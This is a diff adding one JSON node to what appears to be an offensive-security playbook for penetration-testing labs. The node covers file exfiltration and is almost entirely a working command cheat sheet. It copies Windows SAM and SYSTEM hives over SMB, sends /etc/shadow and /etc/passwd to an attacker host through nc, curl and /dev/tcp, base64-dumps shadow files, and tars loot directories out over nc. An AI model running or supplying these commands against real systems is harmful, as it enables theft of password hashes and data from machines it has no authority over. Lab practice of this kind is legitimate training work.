@@ -1,0 +1,26 @@
+{
+  "id": "transfer_exfil",
+  "phase": "SHELL",
+  "title": "File Transfer — Exfiltration (Data Out)",
+  "body": "Get data off the target and back to Kali. SMB mapped drive is the cleanest for Windows. curl POST or nc for Linux.",
+  "cmd": "# ── WINDOWS EXFIL ────────────────────────────────────\n# SMB mapped drive — best method (lab workflow)\n# Attacker (Kali):\nimpacket-smbserver -smb2support kali . -username user -password pass\n\n# Target (Windows):\nnet use m: \\\\$lhost\\kali /user:user pass\ncopy PrivescCheck_*.* m:\\\ncopy winpeas.txt m:\\\ncopy sam m:\\\ncopy SYSTEM m:\\\nnet use m: /delete\n\n# PowerShell upload to Kali HTTP listener\n# Attacker: python3 -c \"import http.server; ...\" (or use uploadserver)\npip3 install uploadserver\npython3 -m uploadserver 80\n# Target:\nInvoke-RestMethod -Uri \"http://$lhost/upload\" -Method Post -InFile C:\\Windows\\Temp\\loot.txt\n\n# nc exfil\n# Attacker: nc -nlvp 4444 > loot.txt\n# Target:\ntype C:\\Windows\\Temp\\loot.txt | nc $lhost 4444\n\n# ── LINUX EXFIL ───────────────────────────────────────\n# curl POST file to Kali\n# Attacker: python3 -m uploadserver 80\ncurl -X POST http://$lhost/upload -F \"file=@/tmp/loot.txt\"\ncurl --upload-file /etc/passwd http://$lhost/passwd\n\n# nc pipe out\n# Attacker: nc -nlvp 4444 > loot.txt\nnc $lhost 4444 < /tmp/loot.txt\ncat /etc/shadow | nc $lhost 4444\n\n# Exfil linpeas output — no python server on target needed\n# Attacker:\nnc -nlvp 80 > linout.txt\n# Target:\ncat linout.txt > /dev/tcp/$lhost/80\n# Safe — no listening port opened on target\n\n# SCP pull from Kali (if SSH available on target)\nscp user@$ip:/etc/shadow ~/shadow\nscp user@$ip:/tmp/linpeas_output.txt ~/loot/\n\n# tar + nc (entire directory)\n# Attacker: nc -nlvp 4444 | tar xvf -\ntar czf - /tmp/loot/ | nc $lhost 4444\n\n# ── BOTH OS — BASE64 ENCODE AND PASTE ────────────────\n# Small files — encode on target, paste into terminal\nbase64 /etc/shadow          # Linux\ncertutil -encode loot.txt loot.b64 && type loot.b64   # Windows\n\n# ── UPLOADSERVER (easiest Kali listener) ──────────────\n# Install once:\npip3 install uploadserver\n# Run:\npython3 -m uploadserver 80\n# Then from target:\ncurl -X POST http://$lhost/upload -F \"file=@/path/to/file\"\n# Files land in current dir on Kali",
+  "warn": null,
+  "choices": [
+    {
+      "label": "Back to Windows privesc",
+      "next": "windows_post_exploit"
+    },
+    {
+      "label": "Back to Linux privesc",
+      "next": "linux_post_exploit"
+    },
+    {
+      "label": "Got hashes — crack them",
+      "next": "hashcrack"
+    },
+    {
+      "label": "Got hashes — PTH",
+      "next": "pth"
+    }
+  ]
+}
